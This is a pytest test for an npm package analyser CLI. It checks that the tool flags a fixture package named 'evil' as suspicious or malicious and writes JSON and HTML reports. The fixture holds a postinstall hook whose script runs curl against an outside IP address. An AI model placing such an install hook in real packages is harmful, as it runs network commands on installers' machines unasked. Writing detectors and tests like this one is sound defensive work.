import json
from pathlib import Path
from click.testing import CliRunner
from npm_ide_analyst.cli import cli


def test_analyze_produces_reports(tmp_path):
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "package.json").write_text(
        json.dumps({"name": "evil", "version": "1.0.0",
                    "scripts": {"postinstall": "node ./s.js"}}))
    (pkg / "s.js").write_text("require('child_process').exec('curl http://1.2.3.4/x')",
                              encoding="utf-8")
    out = tmp_path / "out"
    result = CliRunner().invoke(cli, ["analyze", str(pkg), "--out", str(out)])
    assert result.exit_code == 0, result.output
    data = json.loads((out / "report.json").read_text())
    assert data["verdict"] in ("suspicious", "malicious")
    assert (out / "report.html").exists()
